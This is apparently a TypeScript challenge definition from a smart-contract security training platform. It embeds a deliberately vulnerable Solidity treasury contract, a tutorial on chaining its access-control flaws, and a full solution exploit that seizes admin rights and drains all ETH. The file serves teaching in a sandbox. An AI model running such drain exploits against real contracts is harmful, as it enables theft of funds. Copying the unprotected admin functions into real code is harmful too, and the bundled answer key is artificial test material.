import type { VulnerabilityChallenge } from "@/types/vulnerability";

const TREASURY_SOURCE = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// A treasury with multiple vulnerabilities to chain
// Learn to use multiple attack steps

contract Treasury {
    address public admin;
    address public pendingAdmin;
    uint256 public unlockTime;
    bool public paused;
    mapping(address => uint256) public balances;
    
    event OwnershipTransferred(address indexed previousAdmin, address indexed newAdmin);
    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);

    constructor() payable {
        admin = msg.sender;
        unlockTime = block.timestamp + 1 days;
        balances[msg.sender] = msg.value;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Not admin");
        _;
    }

    modifier whenNotPaused() {
        require(!paused, "Contract is paused");
        _;
    }

    // PROPOSAL: Start ownership transfer
    function proposeNewAdmin(address newAdmin) external {
        pendingAdmin = newAdmin;
    }

    // ACCEPT: Accept the proposal
    function acceptAdmin() external {
        require(msg.sender == pendingAdmin, "Not pending admin");
        emit OwnershipTransferred(admin, pendingAdmin);
        admin = pendingAdmin;
        pendingAdmin = address(0);
    }

    // PAUSE: Admin can pause
    function setPaused(bool _paused) external onlyAdmin {
        paused = _paused;
    }

    // VULNERABLE: No onlyAdmin modifier!
    function emergencyWithdraw(uint256 amount) external {
        require(!paused, "Contract is paused");
        require(amount <= address(this).balance, "Not enough balance");
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }

    function deposit() external payable whenNotPaused {
        require(msg.value > 0, "Must deposit something");
        balances[msg.sender] += msg.value;
        emit Deposited(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external whenNotPaused {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        emit Withdrawn(msg.sender, amount);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}`;

export const tutorialMultiAttack: VulnerabilityChallenge = {
  id: "tutorial-multi-attack",
  title: "Tutorial 5: Multi-Step Attacks",
  category: "access-control",
  difficulty: "intermediate",

  incident: {
    name: "Tutorial Challenge",
    date: "N/A",
    references: [],
  },

  description: `# Tutorial 5: Chaining Multiple Vulnerabilities

Real exploits often require multiple steps. Let's chain vulnerabilities!

## The Target: Treasury Contract

This contract has TWO vulnerabilities to chain:

### Vulnerability 1: Unprotected proposeNewAdmin()
\`\`\`solidity
function proposeNewAdmin(address newAdmin) external {
    pendingAdmin = newAdmin;  // No access control!
}
\`\`\`

### Vulnerability 2: Missing modifier on emergencyWithdraw()
\`\`\`solidity
function emergencyWithdraw(uint256 amount) external {
    // Missing: onlyAdmin modifier!
    require(!paused, "Contract is paused");
    // Anyone can call!
}
\`\`\`

But wait... \`emergencyWithdraw\` checks if the contract is \`paused\`.
And only admin can call \`setPaused(false)\`.

So we need a 3-step attack!

## Attack Chain

\`\`\`
Step 1: proposeNewAdmin(your_address)  → Become pendingAdmin
Step 2: acceptAdmin()                  → Become admin
Step 3: setPaused(false)               → Unpause (if needed)
Step 4: emergencyWithdraw(balance)     → Drain the treasury!
\`\`\`

## Writing Multi-Step Exploit

\`\`\`solidity
contract Exploit {
    ITreasury public target;
    
    constructor(address _target) {
        target = ITreasury(_target);
    }
    
    function attack() external {
        // Step 1: Propose ourselves as admin
        target.proposeNewAdmin(address(this));
        
        // Step 2: Accept admin role
        target.acceptAdmin();
        
        // Step 3: Ensure not paused
        try target.setPaused(false) {} catch {}
        
        // Step 4: Drain everything!
        uint256 balance = address(target).balance;
        if (balance > 0) {
            target.emergencyWithdraw(balance);
        }
    }
    
    // Allow receiving ETH
    receive() external payable {}
}
\`\`\`

## Your Task

1. Analyze the vulnerabilities
2. Write the multi-step exploit
3. Deploy and execute
4. Drain all ETH from Treasury

## Key Points

- Use \`try/catch\` for calls that might fail
- \`receive() external payable {}\` allows contract to receive ETH
- Check state between steps if needed
- Always verify success with inspection tools`,

  starterCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITreasury {
    function proposeNewAdmin(address) external;
    function acceptAdmin() external;
    function setPaused(bool) external;
    function emergencyWithdraw(uint256) external;
    function paused() external view returns (bool);
    function admin() external view returns (address);
    function getBalance() external view returns (uint256);
}

contract Exploit {
    ITreasury public target;
    
    constructor(address _target) {
        target = ITreasury(_target);
    }
    
    function attack() external {
        // TODO: Implement the multi-step attack
        // Step 1: Propose yourself as admin
        // Step 2: Accept admin
        // Step 3: Unpause if needed
        // Step 4: Drain all ETH
    }
    
    receive() external payable {}
}`,

  hint: "Chain: proposeNewAdmin → acceptAdmin → setPaused(false) → emergencyWithdraw",

  setup: {
    contracts: [
      {
        name: "Treasury",
        source: TREASURY_SOURCE,
        value: "100", // 100 ETH to drain
      },
    ],
    attackerBalance: "110", // Needs extra for gas fees
  },

  exposedFunctions: [
    {
      name: "admin",
      signature: "admin()",
      inputs: [],
      outputs: [{ name: "", type: "address" }],
      stateMutability: "view",
    },
    {
      name: "pendingAdmin",
      signature: "pendingAdmin()",
      inputs: [],
      outputs: [{ name: "", type: "address" }],
      stateMutability: "view",
    },
    {
      name: "paused",
      signature: "paused()",
      inputs: [],
      outputs: [{ name: "", type: "bool" }],
      stateMutability: "view",
    },
    {
      name: "getBalance",
      signature: "getBalance()",
      inputs: [],
      outputs: [{ name: "", type: "uint256" }],
      stateMutability: "view",
    },
    {
      name: "unlockTime",
      signature: "unlockTime()",
      inputs: [],
      outputs: [{ name: "", type: "uint256" }],
      stateMutability: "view",
    },
    {
      name: "proposeNewAdmin",
      signature: "proposeNewAdmin(address)",
      inputs: [{ name: "newAdmin", type: "address" }],
      outputs: [],
      stateMutability: "nonpayable",
    },
    {
      name: "acceptAdmin",
      signature: "acceptAdmin()",
      inputs: [],
      outputs: [],
      stateMutability: "nonpayable",
    },
    {
      name: "setPaused",
      signature: "setPaused(bool)",
      inputs: [{ name: "_paused", type: "bool" }],
      outputs: [],
      stateMutability: "nonpayable",
    },
    {
      name: "emergencyWithdraw",
      signature: "emergencyWithdraw(uint256)",
      inputs: [{ name: "amount", type: "uint256" }],
      outputs: [],
      stateMutability: "nonpayable",
    },
  ],

  successCondition: {
    checkDrained: {
      contract: "Treasury",
      maxRemaining: "0",
    },
  },

  solution: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITreasury {
    function proposeNewAdmin(address) external;
    function acceptAdmin() external;
    function setPaused(bool) external;
    function emergencyWithdraw(uint256) external;
    function paused() external view returns (bool);
    function admin() external view returns (address);
    function getBalance() external view returns (uint256);
}

contract Exploit {
    ITreasury public target;
    
    constructor(address _target) {
        target = ITreasury(_target);
    }
    
    function attack() external {
        // Step 1: Propose ourselves as admin
        target.proposeNewAdmin(address(this));
        
        // Step 2: Accept admin role
        target.acceptAdmin();
        
        // Step 3: Ensure not paused
        try target.setPaused(false) {} catch {}
        
        // Step 4: Drain everything!
        uint256 balance = address(target).balance;
        if (balance > 0) {
            target.emergencyWithdraw(balance);
        }
    }
    
    receive() external payable {}
}`,
};